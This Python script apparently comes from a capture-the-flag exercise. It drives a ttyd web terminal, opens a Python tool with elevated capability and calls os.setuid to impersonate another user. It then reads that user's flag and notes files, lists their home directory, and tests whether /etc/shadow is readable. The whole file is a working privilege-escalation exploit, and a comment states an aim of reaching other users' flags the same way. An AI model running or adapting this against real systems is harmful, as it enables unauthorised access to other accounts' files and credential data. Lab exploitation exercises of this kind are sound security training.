"""Verify the deephax flag and capture supporting evidence."""
import asyncio
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ttyd_client import Shell  # noqa: E402


async def main():
    async with Shell(cols=140, rows=50) as sh:
        await sh.read(2.0)
        await sh.send("/opt/crypto/pytool")
        await sh.read(3.0)

        await sh.send("import os; os.setuid(1002)")
        await sh.read(2.0)

        # exact bytes of the flag, plus the supporting artefacts
        await sh.send(
            "d='/home/deephax/flag.txt';"
            "b=open(d,'rb').read();"
            "print('RAWLEN', len(b));"
            "print('RAWFLAG ' + b.decode().strip());"
            "print('NOTES_START');"
            "print(open('/home/deephax/notes.txt').read());"
            "print('NOTES_END')"
        )
        print(await sh.read(5.0))

        await sh.send(
            "import subprocess as s;"
            "print(s.run(['ls','-laR','/home/deephax'],capture_output=True,text=True).stdout)"
        )
        print(await sh.read(5.0))

        # confirm we can also reach the other users' flags with the same primitive
        await sh.send(
            "print('UIDNOW', os.getuid());"
            "print('SUDOERS_OK', os.access('/etc/shadow', os.R_OK))"
        )
        print(await sh.read(3.0))

        await sh.send("exit()")
        await sh.read(1.5)


asyncio.run(main())
